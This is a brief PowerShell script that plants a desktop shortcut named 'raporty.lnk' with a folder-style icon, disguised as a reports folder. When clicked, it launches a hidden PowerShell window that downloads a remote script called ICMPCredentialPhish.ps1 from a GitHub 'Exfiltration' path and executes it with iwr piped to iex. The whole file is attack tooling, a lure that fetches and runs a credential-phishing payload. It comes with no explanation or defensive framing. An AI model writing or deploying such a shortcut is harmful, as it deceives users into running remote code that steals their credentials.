$w = New-Object -ComObject WScript.Shell
$desktop = [system.environment]::GetFolderPath("Desktop")
$link = $w.CreateShortcut("$desktop\raporty.lnk")
$link.TargetPath = 'powershell.exe'
$link.arguments =
'-w h -c "& { iwr https://github.com/TomasBombadil/TOOLS/Exfiltration/ICMPCredentialPhish.ps1 | iex } "  '
$link.workingDirectory = 'c:\'
$link.IconLocation = "C:\Windows\System32\Shell32.dll,3"
$link.save() > $null